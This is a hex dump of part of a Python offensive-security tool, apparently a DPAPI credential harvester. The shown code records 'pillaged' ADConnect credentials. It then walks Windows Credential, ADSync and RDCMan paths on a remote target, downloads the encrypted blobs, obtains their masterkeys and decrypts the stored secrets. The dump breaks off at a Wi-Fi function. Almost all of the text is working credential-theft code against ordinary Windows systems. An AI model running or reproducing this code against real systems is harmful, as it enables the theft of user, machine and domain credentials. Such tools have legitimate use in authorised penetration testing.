-00007930: 657d 203a 207b 6670 777d 5c6e 220a 0909  e} : {fpw}\n"...
-00007940: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
-00007950: 6e67 2e69 6e66 6f28 0a09 0909 0909 0909  ng.info(........
-00007960: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-00007970: 6e73 2e74 6172 6765 745f 6970 7d5d 205b  ns.target_ip}] [
-00007980: 2b5d 207b 6263 6f6c 6f72 732e 4f4b 4752  +] {bcolors.OKGR
-00007990: 4545 4e7d 2041 4443 4f4e 4e45 4354 203a  EEN} ADCONNECT :
-000079a0: 207b 6263 6f6c 6f72 732e 4f4b 4752 4545   {bcolors.OKGREE
-000079b0: 4e7d 202d 207b 7573 6572 6e61 6d65 7d20  N} - {username} 
-000079c0: 3a20 7b66 7077 7d7b 6263 6f6c 6f72 732e  : {fpw}{bcolors.
-000079d0: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
-000079e0: 2323 2323 2323 2323 2323 2323 5052 4f43  ############PROC
-000079f0: 4553 5349 4e47 2044 4154 410a 0909 0909  ESSING DATA.....
-00007a00: 0909 0909 7365 6c66 2e64 622e 6164 645f  ....self.db.add_
-00007a10: 6372 6564 7a28 6372 6564 7a5f 7479 7065  credz(credz_type
-00007a20: 3d27 4144 436f 6e6e 6563 7427 2c0a 0909  ='ADConnect',...
-00007a30: 0909 0909 0909 0909 0909 2020 6372 6564  ..........  cred
-00007a40: 7a5f 7573 6572 6e61 6d65 3d75 7365 726e  z_username=usern
-00007a50: 616d 652c 0a09 0909 0909 0909 0909 0909  ame,............
-00007a60: 0920 2063 7265 647a 5f70 6173 7377 6f72  .  credz_passwor
-00007a70: 643d 6670 772c 0a09 0909 0909 0909 0909  d=fpw,..........
-00007a80: 0909 0920 2063 7265 647a 5f74 6172 6765  ...  credz_targe
-00007a90: 743d 2727 2c0a 0909 0909 0909 0909 0909  t='',...........
-00007aa0: 0909 2020 6372 6564 7a5f 7061 7468 3d27  ..  credz_path='
-00007ab0: 272c 2020 2320 7573 6572 2e66 696c 6573  ',  # user.files
-00007ac0: 5b27 4144 434f 4e4e 4543 5427 5d5b 2770  ['ADCONNECT']['p
-00007ad0: 6174 6827 5d2c 0a09 0909 0909 0909 0909  ath'],..........
-00007ae0: 0909 0920 2070 696c 6c61 6765 645f 6672  ...  pillaged_fr
-00007af0: 6f6d 5f63 6f6d 7075 7465 725f 6970 3d73  om_computer_ip=s
-00007b00: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-00007b10: 6574 5f69 702c 0a09 0909 0909 0909 0909  et_ip,..........
-00007b20: 0909 0920 2070 696c 6c61 6765 645f 6672  ...  pillaged_fr
-00007b30: 6f6d 5f75 7365 726e 616d 653d 7573 6572  om_username=user
-00007b40: 2e75 7365 726e 616d 6529 0a09 0909 0909  .username)......
-00007b50: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
-00007b60: 2061 7320 6578 3a0a 0909 0909 0909 7365   as ex:.......se
-00007b70: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-00007b80: 280a 0909 0909 0909 0966 225b 7b73 656c  (........f"[{sel
-00007b90: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00007ba0: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
-00007bb0: 4152 4e49 4e47 7d45 7863 6570 7469 6f6e  ARNING}Exception
-00007bc0: 2069 6e20 4765 745f 4144 5f43 6f6e 6e65   in Get_AD_Conne
-00007bd0: 6374 2032 7b62 636f 6c6f 7273 2e45 4e44  ct 2{bcolors.END
-00007be0: 437d 2229 0a09 0909 0909 0973 656c 662e  C}").......self.
-00007bf0: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
-00007c00: 290a 0909 0965 6c73 653a 0a09 0909 0973  )....else:.....s
-00007c10: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
-00007c20: 280a 0909 0909 0966 225b 7b73 656c 662e  (......f"[{self.
-00007c30: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00007c40: 707d 5d20 5b2b 5d20 7b62 636f 6c6f 7273  p}] [+] {bcolors
-00007c50: 2e57 4152 4e49 4e47 7d20 4d61 7374 6572  .WARNING} Master
-00007c60: 6b65 7920 4e4f 5420 466f 756e 6420 666f  key NOT Found fo
-00007c70: 7220 4144 436f 6e6e 6563 7420 7b62 636f  r ADConnect {bco
-00007c80: 6c6f 7273 2e45 4e44 437d 2229 0a09 0972  lors.ENDC}")...r
-00007c90: 6574 7572 6e20 696e 666f 0a0a 0964 6566  eturn info...def
-00007ca0: 2047 6574 5f44 5041 5049 5f50 726f 7465   Get_DPAPI_Prote
-00007cb0: 6374 6564 5f46 696c 6573 2873 656c 6629  cted_Files(self)
-00007cc0: 3a0a 0909 7365 6c66 2e6c 6f67 6769 6e67  :...self.logging
-00007cd0: 2e69 6e66 6f28 0a09 0909 6622 5b7b 7365  .info(....f"[{se
-00007ce0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-00007cf0: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
-00007d00: 4f4b 424c 5545 7d5b 2b5d 2047 6174 6865  OKBLUE}[+] Gathe
-00007d10: 7269 6e67 2044 5041 5049 2053 6563 7265  ring DPAPI Secre
-00007d20: 7420 626c 6f62 7320 6f6e 2074 6865 2074  t blobs on the t
-00007d30: 6172 6765 747b 6263 6f6c 6f72 732e 454e  arget{bcolors.EN
-00007d40: 4443 7d22 290a 0909 626c 6163 6b6c 6973  DC}")...blacklis
-00007d50: 7420 3d20 5b27 2e27 2c20 272e 2e27 5d0a  t = ['.', '..'].
-00007d60: 0909 2320 6372 6564 656e 7469 616c 7320  ..# credentials 
-00007d70: 3f0a 0909 2320 5661 756c 7473 203f 0a09  ?...# Vaults ?..
-00007d80: 0923 2050 6172 7365 2063 6872 6f6d 650a  .# Parse chrome.
-00007d90: 0909 2320 6175 7472 6573 206e 6176 6967  ..# autres navig
-00007da0: 6174 6575 7273 203f 0a09 0923 2043 7265  ateurs ?...# Cre
-00007db0: 6448 6973 746f 7279 0a09 0923 2041 7070  dHistory...# App
-00007dc0: 6461 7461 2052 6f61 6d69 6e67 203f 0a0a  data Roaming ?..
-00007dd0: 0909 7573 6572 5f64 6972 6563 746f 7269  ..user_directori
-00007de0: 6573 203d 205b 2822 5573 6572 735c 5c7b  es = [("Users\\{
-00007df0: 7573 6572 6e61 6d65 7d5c 5c41 7070 4461  username}\\AppDa
-00007e00: 7461 5c5c 4c6f 6361 6c5c 5c4d 6963 726f  ta\\Local\\Micro
-00007e10: 736f 6674 5c5c 4372 6564 656e 7469 616c  soft\\Credential
-00007e20: 7322 2c20 272a 272c 2027 6372 6564 656e  s", '*', 'creden
-00007e30: 7469 616c 272c 2027 444f 4d41 494e 2729  tial', 'DOMAIN')
-00007e40: 2c0a 0909 0909 0909 0928 2257 696e 646f  ,........("Windo
-00007e50: 7773 5c5c 5365 7276 6963 6550 726f 6669  ws\\ServiceProfi
-00007e60: 6c65 735c 5c41 4453 796e 635c 5c41 7070  les\\ADSync\\App
-00007e70: 4461 7461 5c5c 4c6f 6361 6c5c 5c4d 6963  Data\\Local\\Mic
-00007e80: 726f 736f 6674 5c5c 4372 6564 656e 7469  rosoft\\Credenti
-00007e90: 616c 7322 2c20 272a 272c 0a09 0909 0909  als", '*',......
-00007ea0: 0909 2027 6372 6564 656e 7469 616c 272c  .. 'credential',
-00007eb0: 2027 4d41 4348 494e 452d 5553 4552 2729   'MACHINE-USER')
-00007ec0: 2c0a 0909 0909 0909 0928 0a09 0909 0909  ,........(......
-00007ed0: 0909 2255 7365 7273 5c5c 7b75 7365 726e  .."Users\\{usern
-00007ee0: 616d 657d 5c5c 4170 7044 6174 615c 5c52  ame}\\AppData\\R
-00007ef0: 6f61 6d69 6e67 5c5c 4d69 6372 6f73 6f66  oaming\\Microsof
-00007f00: 745c 5c43 7265 6465 6e74 6961 6c73 222c  t\\Credentials",
-00007f10: 2027 2a27 2c20 2763 7265 6465 6e74 6961   '*', 'credentia
-00007f20: 6c27 2c20 2744 4f4d 4149 4e27 292c 0a09  l', 'DOMAIN'),..
-00007f30: 0909 0909 0909 280a 0909 0909 0909 0922  ......(........"
-00007f40: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
-00007f50: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
-00007f60: 6c5c 5c4d 6963 726f 736f 6674 5c5c 5265  l\\Microsoft\\Re
-00007f70: 6d6f 7465 2044 6573 6b74 6f70 2043 6f6e  mote Desktop Con
-00007f80: 6e65 6374 696f 6e20 4d61 6e61 6765 725c  nection Manager\
-00007f90: 5c52 4443 4d61 6e2e 7365 7474 696e 6773  \RDCMan.settings
-00007fa0: 222c 0a09 0909 0909 0909 222a 2e72 6467  ",........"*.rdg
-00007fb0: 222c 2027 7264 6727 2c20 2744 4f4d 4149  ", 'rdg', 'DOMAI
-00007fc0: 4e27 290a 0909 0909 0909 095d 2020 2320  N')........]  # 
-00007fd0: 4144 4420 4465 736b 746f 7020 666f 7220  ADD Desktop for 
-00007fe0: 5244 470a 0909 6d61 6368 696e 655f 6469  RDG...machine_di
-00007ff0: 7265 6374 6f72 6965 7320 3d20 5b28 2257  rectories = [("W
-00008000: 696e 646f 7773 5c5c 5379 7374 656d 3332  indows\\System32
-00008010: 5c5c 636f 6e66 6967 5c5c 7379 7374 656d  \\config\\system
-00008020: 7072 6f66 696c 655c 5c41 7070 4461 7461  profile\\AppData
-00008030: 5c5c 4c6f 6361 6c5c 5c4d 6963 726f 736f  \\Local\\Microso
-00008040: 6674 5c5c 4372 6564 656e 7469 616c 7322  ft\\Credentials"
-00008050: 2c20 272a 272c 0a09 0909 0909 0909 0927  , '*',.........'
-00008060: 6372 6564 656e 7469 616c 272c 2027 4d41  credential', 'MA
-00008070: 4348 494e 4527 292c 0a09 0909 0909 0909  CHINE'),........
-00008080: 2020 2028 2257 696e 646f 7773 5c5c 5365     ("Windows\\Se
-00008090: 7276 6963 6550 726f 6669 6c65 735c 5c41  rviceProfiles\\A
-000080a0: 4453 796e 635c 5c41 7070 4461 7461 5c5c  DSync\\AppData\\
-000080b0: 4c6f 6361 6c5c 5c4d 6963 726f 736f 6674  Local\\Microsoft
-000080c0: 5c5c 4372 6564 656e 7469 616c 7322 2c20  \\Credentials", 
-000080d0: 272a 272c 0a09 0909 0909 0909 0927 6372  '*',.........'cr
-000080e0: 6564 656e 7469 616c 272c 2027 4d41 4348  edential', 'MACH
-000080f0: 494e 452d 5553 4552 2729 2c0a 0909 0909  INE-USER'),.....
-00008100: 0909 0920 2020 2822 5573 6572 735c 5c41  ...   ("Users\\A
-00008110: 4453 796e 635c 5c41 7070 4461 7461 5c5c  DSync\\AppData\\
-00008120: 4c6f 6361 6c5c 5c4d 6963 726f 736f 6674  Local\\Microsoft
-00008130: 5c5c 4372 6564 656e 7469 616c 7322 2c20  \\Credentials", 
-00008140: 272a 272c 2027 6372 6564 656e 7469 616c  '*', 'credential
-00008150: 272c 0a09 0909 0909 0909 0927 4d41 4348  ',.........'MACH
-00008160: 494e 452d 5553 4552 2729 2c0a 0909 0909  INE-USER'),.....
-00008170: 0909 0920 2020 2320 5661 6c69 6465 7220  ...   # Valider 
-00008180: 6c65 2025 7379 7374 656d 6469 7225 2073  le %systemdir% s
-00008190: 656c 6f6e 206c 6120 7665 7273 696f 6e20  elon la version 
-000081a0: 6465 2077 696e 646f 7773 203f 0a09 0909  de windows ?....
-000081b0: 0909 0909 2020 205d 0a0a 0909 666f 7220  ....   ]....for 
-000081c0: 7573 6572 2069 6e20 7365 6c66 2e75 7365  user in self.use
-000081d0: 7273 3a0a 0909 0969 6620 7573 6572 2e75  rs:....if user.u
-000081e0: 7365 726e 616d 6520 3d3d 2027 4d41 4348  sername == 'MACH
-000081f0: 494e 4524 273a 0a09 0909 0964 6972 6563  INE$':.....direc
-00008200: 746f 7269 6573 5f74 6f5f 7573 6520 3d20  tories_to_use = 
-00008210: 6d61 6368 696e 655f 6469 7265 6374 6f72  machine_director
-00008220: 6965 730a 0909 0965 6c73 653a 0a09 0909  ies....else:....
-00008230: 0964 6972 6563 746f 7269 6573 5f74 6f5f  .directories_to_
-00008240: 7573 6520 3d20 7573 6572 5f64 6972 6563  use = user_direc
-00008250: 746f 7269 6573 0a0a 0909 0923 2069 6620  tories.....# if 
-00008260: 6c65 6e28 7573 6572 2e6d 6173 7465 726b  len(user.masterk
-00008270: 6579 7329 3e30 3a23 5061 7320 6465 206d  eys)>0:#Pas de m
-00008280: 6173 7465 726b 6579 733d 3d70 6173 2064  asterkeys==pas d
-00008290: 6520 6461 7461 7320 6120 7265 6375 700a  e datas a recup.
-000082a0: 0909 0966 6f72 2069 6e66 6f20 696e 2064  ...for info in d
-000082b0: 6972 6563 746f 7269 6573 5f74 6f5f 7573  irectories_to_us
-000082c0: 653a 0a09 0909 096d 795f 6469 722c 206d  e:.....my_dir, m
-000082d0: 795f 6d61 736b 2c20 6d79 5f62 6c6f 625f  y_mask, my_blob_
-000082e0: 7479 7065 2c20 6d79 5f75 7365 725f 7479  type, my_user_ty
-000082f0: 7065 203d 2069 6e66 6f0a 0909 0909 746d  pe = info.....tm
-00008300: 705f 7077 6420 3d20 6d79 5f64 6972 2e66  p_pwd = my_dir.f
-00008310: 6f72 6d61 7428 0a09 0909 0909 7573 6572  ormat(......user
-00008320: 6e61 6d65 3d75 7365 722e 7573 6572 6e61  name=user.userna
-00008330: 6d65 2920 2023 236e 7470 6174 682e 6a6f  me)  ##ntpath.jo
-00008340: 696e 286e 7470 6174 682e 6a6f 696e 2827  in(ntpath.join('
-00008350: 5573 6572 7327 2c20 7573 6572 2e75 7365  Users', user.use
-00008360: 726e 616d 6529 2c20 6d79 5f64 6972 290a  rname), my_dir).
-00008370: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-00008380: 2e64 6562 7567 280a 0909 0909 0966 225b  .debug(......f"[
-00008390: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-000083a0: 7267 6574 5f69 707d 5d20 4c6f 6f6b 696e  rget_ip}] Lookin
-000083b0: 6720 666f 7220 7b75 7365 722e 7573 6572  g for {user.user
-000083c0: 6e61 6d65 7d20 6669 6c65 7320 696e 207b  name} files in {
-000083d0: 746d 705f 7077 647d 2077 6974 6820 6d61  tmp_pwd} with ma
-000083e0: 736b 207b 6d79 5f6d 6173 6b7d 2229 0a09  sk {my_mask}")..
-000083f0: 0909 096d 795f 6469 7265 6374 6f72 7920  ...my_directory 
-00008400: 3d20 7365 6c66 2e6d 7966 696c 656f 7073  = self.myfileops
-00008410: 2e64 6f5f 6c73 2874 6d70 5f70 7764 2c20  .do_ls(tmp_pwd, 
-00008420: 6d79 5f6d 6173 6b2c 2064 6973 706c 6179  my_mask, display
-00008430: 3d46 616c 7365 290a 0909 0909 666f 7220  =False).....for 
-00008440: 696e 666f 7320 696e 206d 795f 6469 7265  infos in my_dire
-00008450: 6374 6f72 793a 0a09 0909 0909 6c6f 6e67  ctory:......long
-00008460: 6e61 6d65 2c20 6973 5f64 6972 6563 746f  name, is_directo
-00008470: 7279 203d 2069 6e66 6f73 0a09 0909 0909  ry = infos......
-00008480: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-00008490: 7567 2822 6c73 2072 6574 7572 6e65 6420  ug("ls returned 
-000084a0: 6669 6c65 2025 7322 2025 206c 6f6e 676e  file %s" % longn
-000084b0: 616d 6529 0a09 0909 0909 6966 206c 6f6e  ame)......if lon
-000084c0: 676e 616d 6520 6e6f 7420 696e 2062 6c61  gname not in bla
-000084d0: 636b 6c69 7374 2061 6e64 206e 6f74 2069  cklist and not i
-000084e0: 735f 6469 7265 6374 6f72 793a 0a09 0909  s_directory:....
-000084f0: 0909 0974 7279 3a0a 0909 0909 0909 0973  ...try:........s
-00008500: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-00008510: 6728 0a09 0909 0909 0909 0966 225b 7b73  g(.........f"[{s
-00008520: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-00008530: 6574 5f69 707d 5d20 5b2b 5d20 466f 756e  et_ip}] [+] Foun
-00008540: 6420 7b62 636f 6c6f 7273 2e4f 4b42 4c55  d {bcolors.OKBLU
-00008550: 457d 7b75 7365 722e 7573 6572 6e61 6d65  E}{user.username
-00008560: 7d7b 6263 6f6c 6f72 732e 454e 4443 7d20  }{bcolors.ENDC} 
-00008570: 656e 6372 7970 7465 6420 6669 6c65 7320  encrypted files 
-00008580: 7b6c 6f6e 676e 616d 657d 2229 0a09 0909  {longname}")....
-00008590: 0909 0909 2320 446f 776e 6c6f 6164 696e  ....# Downloadin
-000085a0: 6720 426c 6f62 2066 696c 650a 0909 0909  g Blob file.....
-000085b0: 0909 096c 6f63 616c 6669 6c65 203d 2073  ...localfile = s
-000085c0: 656c 662e 6d79 6669 6c65 6f70 732e 6765  elf.myfileops.ge
-000085d0: 745f 6669 6c65 286e 7470 6174 682e 6a6f  t_file(ntpath.jo
-000085e0: 696e 2874 6d70 5f70 7764 2c20 6c6f 6e67  in(tmp_pwd, long
-000085f0: 6e61 6d65 2929 0a09 0909 0909 0909 7573  name))........us
-00008600: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
-00008610: 655d 203d 207b 7d0a 0909 0909 0909 0975  e] = {}........u
-00008620: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
-00008630: 6d65 5d5b 2774 7970 6527 5d20 3d20 6d79  me]['type'] = my
-00008640: 5f62 6c6f 625f 7479 7065 0a09 0909 0909  _blob_type......
-00008650: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
-00008660: 676e 616d 655d 5b27 7374 6174 7573 275d  gname]['status']
-00008670: 203d 2027 656e 6372 7970 7465 6427 0a09   = 'encrypted'..
-00008680: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
-00008690: 5b6c 6f6e 676e 616d 655d 5b27 7061 7468  [longname]['path
-000086a0: 275d 203d 206c 6f63 616c 6669 6c65 0a0a  '] = localfile..
-000086b0: 0909 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
-000086c0: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
-000086d0: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
-000086e0: 0909 0909 0909 6d79 6f70 7469 6f6e 732e  ......myoptions.
-000086f0: 6669 6c65 203d 206c 6f63 616c 6669 6c65  file = localfile
-00008700: 2020 2320 4d61 7374 6572 6b65 7966 696c    # Masterkeyfil
-00008710: 6520 746f 2070 6172 7365 0a09 0909 0909  e to parse......
-00008720: 0909 6d79 6f70 7469 6f6e 732e 6d61 7374  ..myoptions.mast
-00008730: 6572 6b65 7973 203d 204e 6f6e 6520 2023  erkeys = None  #
-00008740: 2075 7365 722e 6d61 7374 6572 6b65 7973   user.masterkeys
-00008750: 5f66 696c 650a 0909 0909 0909 096d 796f  _file........myo
-00008760: 7074 696f 6e73 2e6b 6579 203d 204e 6f6e  ptions.key = Non
-00008770: 650a 0909 0909 0909 096d 7964 7061 7069  e........mydpapi
-00008780: 203d 2044 5041 5049 286d 796f 7074 696f   = DPAPI(myoptio
-00008790: 6e73 2c20 7365 6c66 2e6c 6f67 6769 6e67  ns, self.logging
-000087a0: 290a 0909 0909 0909 0967 7569 6420 3d20  )........guid = 
-000087b0: 6d79 6470 6170 692e 6669 6e64 5f43 7265  mydpapi.find_Cre
-000087c0: 6465 6e74 6961 6c46 696c 655f 6d61 7374  dentialFile_mast
-000087d0: 6572 6b65 7928 290a 0909 0909 0909 0973  erkey()........s
-000087e0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-000087f0: 6728 6622 5b7b 7365 6c66 2e6f 7074 696f  g(f"[{self.optio
-00008800: 6e73 2e74 6172 6765 745f 6970 7d5d 204c  ns.target_ip}] L
-00008810: 6f6f 6b69 6e67 2066 6f72 207b 6c6f 6e67  ooking for {long
-00008820: 6e61 6d65 7d20 6d61 7374 6572 6b65 7920  name} masterkey 
-00008830: 3a20 7b67 7569 647d 2229 0a09 0909 0909  : {guid}")......
-00008840: 0909 6966 2067 7569 6420 213d 204e 6f6e  ..if guid != Non
-00008850: 653a 0a09 0909 0909 0909 096d 6173 7465  e:.........maste
-00008860: 726b 6579 203d 2073 656c 662e 6765 745f  rkey = self.get_
-00008870: 6d61 7374 6572 6b65 7928 7573 6572 3d75  masterkey(user=u
-00008880: 7365 722c 2067 7569 643d 6775 6964 2c20  ser, guid=guid, 
-00008890: 7479 7065 3d6d 795f 7573 6572 5f74 7970  type=my_user_typ
-000088a0: 6529 0a09 0909 0909 0909 0969 6620 6d61  e).........if ma
-000088b0: 7374 6572 6b65 7920 213d 204e 6f6e 653a  sterkey != None:
-000088c0: 0a09 0909 0909 0909 0909 6966 206d 6173  ..........if mas
-000088d0: 7465 726b 6579 5b27 7374 6174 7573 275d  terkey['status']
-000088e0: 203d 3d20 2764 6563 7279 7074 6564 273a   == 'decrypted':
-000088f0: 0a09 0909 0909 0909 0909 096d 7964 7061  ...........mydpa
-00008900: 7069 2e6f 7074 696f 6e73 2e6b 6579 203d  pi.options.key =
-00008910: 206d 6173 7465 726b 6579 5b27 6b65 7927   masterkey['key'
-00008920: 5d0a 0909 0909 0909 0909 0909 6372 6564  ]...........cred
-00008930: 5f64 6174 6120 3d20 6d79 6470 6170 692e  _data = mydpapi.
-00008940: 6465 6372 7970 745f 6372 6564 656e 7469  decrypt_credenti
-00008950: 616c 2829 0a09 0909 0909 0909 0909 0969  al()...........i
-00008960: 6620 6372 6564 5f64 6174 6120 213d 204e  f cred_data != N
-00008970: 6f6e 653a 0a09 0909 0909 0909 0909 0909  one:............
-00008980: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-00008990: 7567 280a 0909 0909 0909 0909 0909 0909  ug(.............
-000089a0: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
-000089b0: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
-000089c0: 6f6c 6f72 732e 4f4b 4752 4545 4e7d 4465  olors.OKGREEN}De
-000089d0: 6372 7970 7469 6f6e 2073 7563 6365 7373  cryption success
-000089e0: 6675 6c6c 206f 6620 7b62 636f 6c6f 7273  full of {bcolors
-000089f0: 2e4f 4b42 4c55 457d 7b75 7365 722e 7573  .OKBLUE}{user.us
-00008a00: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
-00008a10: 454e 4443 7d20 5365 6372 6574 207b 6c6f  ENDC} Secret {lo
-00008a20: 6e67 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ngname}{bcolors.
-00008a30: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
-00008a40: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
-00008a50: 6e67 6e61 6d65 5d5b 2773 7461 7475 7327  ngname]['status'
-00008a60: 5d20 3d20 2764 6563 7279 7074 6564 270a  ] = 'decrypted'.
-00008a70: 0909 0909 0909 0909 0909 0975 7365 722e  ...........user.
-00008a80: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
-00008a90: 2764 6174 6127 5d20 3d20 6372 6564 5f64  'data'] = cred_d
-00008aa0: 6174 610a 0909 0909 0909 0909 0909 0973  ata............s
-00008ab0: 656c 662e 7072 6f63 6573 735f 6465 6372  elf.process_decr
-00008ac0: 7970 7465 645f 6461 7461 2875 7365 722c  ypted_data(user,
-00008ad0: 2075 7365 722e 6669 6c65 735b 0a09 0909   user.files[....
-00008ae0: 0909 0909 0909 0909 096c 6f6e 676e 616d  .........longnam
-00008af0: 655d 2920 2023 2063 7265 645f 6461 7461  e])  # cred_data
-00008b00: 2c75 7365 722c 6c6f 6361 6c66 696c 652c  ,user,localfile,
-00008b10: 6d79 5f62 6c6f 625f 7479 7065 290a 0909  my_blob_type)...
-00008b20: 0909 0909 0909 0909 656c 7365 3a0a 0909  ........else:...
-00008b30: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
-00008b40: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-00008b50: 0909 0909 0909 0909 0966 225b 7b73 656c  .........f"[{sel
-00008b60: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00008b70: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
-00008b80: 4152 4e49 4e47 7d45 7272 6f72 2064 6563  ARNING}Error dec
-00008b90: 7279 7074 696e 6720 426c 6f62 2066 6f72  rypting Blob for
-00008ba0: 207b 6c6f 6361 6c66 696c 657d 2077 6974   {localfile} wit
-00008bb0: 6820 4d61 7374 6572 6b65 797b 6263 6f6c  h Masterkey{bcol
-00008bc0: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
-00008bd0: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
-00008be0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-00008bf0: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
-00008c00: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-00008c10: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00008c20: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
-00008c30: 477d 4572 726f 7220 6465 6372 7970 7469  G}Error decrypti
-00008c40: 6e67 2042 6c6f 6220 666f 7220 7b6c 6f63  ng Blob for {loc
-00008c50: 616c 6669 6c65 7d20 7769 7468 204d 6173  alfile} with Mas
-00008c60: 7465 726b 6579 202d 204d 6173 7465 726b  terkey - Masterk
-00008c70: 6579 206e 6f74 2064 6563 7279 7074 6564  ey not decrypted
-00008c80: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
-00008c90: 0a09 0909 0909 0909 0965 6c73 653a 0a09  .........else:..
-00008ca0: 0909 0909 0909 0909 7365 6c66 2e6c 6f67  ........self.log
-00008cb0: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
-00008cc0: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-00008cd0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-00008ce0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
-00008cf0: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
-00008d00: 7469 6e67 2042 6c6f 6220 666f 7220 7b6c  ting Blob for {l
-00008d10: 6f63 616c 6669 6c65 7d20 7769 7468 204d  ocalfile} with M
-00008d20: 6173 7465 726b 6579 2d20 6361 6e74 2067  asterkey- cant g
-00008d30: 6574 206d 6173 7465 726b 6579 207b 6775  et masterkey {gu
-00008d40: 6964 7d7b 6263 6f6c 6f72 732e 454e 4443  id}{bcolors.ENDC
-00008d50: 7d22 290a 0909 0909 0909 0965 6c73 653a  }")........else:
-00008d60: 0a09 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
-00008d70: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-00008d80: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-00008d90: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-00008da0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
-00008db0: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
-00008dc0: 7469 6e67 2042 6c6f 6220 666f 7220 7b6c  ting Blob for {l
-00008dd0: 6f63 616c 6669 6c65 7d20 7769 7468 204d  ocalfile} with M
-00008de0: 6173 7465 726b 6579 202d 2063 616e 2074  asterkey - can t
-00008df0: 2067 6574 2074 6865 2047 5549 4420 6f66   get the GUID of
-00008e00: 206d 6173 7465 726b 6579 2066 726f 6d20   masterkey from 
-00008e10: 626c 6f62 2066 696c 657b 6263 6f6c 6f72  blob file{bcolor
-00008e20: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
-00008e30: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
-00008e40: 2061 7320 6578 3a0a 0909 0909 0909 0973   as ex:........s
-00008e50: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-00008e60: 6728 0a09 0909 0909 0909 0966 225b 7b73  g(.........f"[{s
-00008e70: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-00008e80: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
-00008e90: 2e57 4152 4e49 4e47 7d45 7863 6570 7469  .WARNING}Excepti
-00008ea0: 6f6e 2064 6563 7279 7074 696e 6720 426c  on decrypting Bl
-00008eb0: 6f62 2066 6f72 207b 6c6f 6361 6c66 696c  ob for {localfil
-00008ec0: 657d 2077 6974 6820 4d61 7374 6572 6b65  e} with Masterke
-00008ed0: 797b 6263 6f6c 6f72 732e 454e 4443 7d22  y{bcolors.ENDC}"
-00008ee0: 290a 0909 0909 0909 0973 656c 662e 6c6f  )........self.lo
-00008ef0: 6767 696e 672e 6465 6275 6728 6578 290a  gging.debug(ex).
-00008f00: 0909 7265 7475 726e 2031 0a0a 0964 6566  ..return 1...def
-00008f10: 2047 6574 5769 6669 2873 656c 6629 3a0a   GetWifi(self):.
